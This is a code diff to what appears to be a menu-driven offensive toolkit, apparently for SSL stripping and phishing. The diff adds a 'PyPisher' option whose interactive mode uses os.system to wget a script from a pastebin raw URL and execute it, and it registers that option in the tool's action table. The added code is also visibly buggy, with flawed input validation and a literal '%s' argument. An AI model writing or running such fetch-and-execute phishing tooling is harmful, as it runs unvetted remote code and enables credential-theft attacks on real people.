@@ -127,6 +127,50 @@ class SSLtrip:
         safe_print(ctx, "\n[*] SSLtrip session finished.\n")
 # endregion
 
+# region: override class: pypisher
+class PyPisher:
+    menu_items = [
+        "Run interactive",
+        "Back"
+    ]
+        
+    def __init__(self, ctx=None):
+        self.ctx = ctx or {}
+
+    def run(self, ctx):
+        self.ctx = ctx
+        safe_print(ctx, f"[*] PyPisher: selected '{ctx.get('item')}'")
+        self.sub_menu(ctx)
+
+    def sub_menu(self, ctx):
+        safe_print(ctx, "\nPyPisher options:")
+        for i, it in enumerate(self.menu_items, 1):
+            safe_print(ctx, f"  [{i}] {it}")
+        safe_print(ctx, "")
+            
+        choice = safe_input(ctx.get("prompt", "root ~# "), ctx).strip()
+        
+        if not choice.isdigit() or not (1 <= int(choice) <= len(self.menu_items)):
+            self.__init__()
+
+        idx = int(choice) - 1
+        sel = self.menu_items[idx]
+
+        if sel.lower() == "back":
+            return
+
+        if "interactive" in sel:
+            self.run_interactive(ctx)
+
+    def run_interactive(self, ctx):
+        safe_print(ctx, "\n[*] Starting pypisher session.\n")
+
+        os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
+        os.system("python pisher.py %s")
+
+        safe_print(ctx, "\n[*] PyPisher session finished.\n")
+# endregion
+
 # region: actions utility
 def run_action(action, ctx):
     if isinstance(action, type):
@@ -157,7 +201,7 @@ def execute(ctx):
     fprint(f"[*] Executing: {item}")
     actions = {
         "SSLtrip": SSLtrip,
-        #"pyPISHER",
+        "pyPISHER": PyPisher,
         #"SMTP Mailer"
     }
 
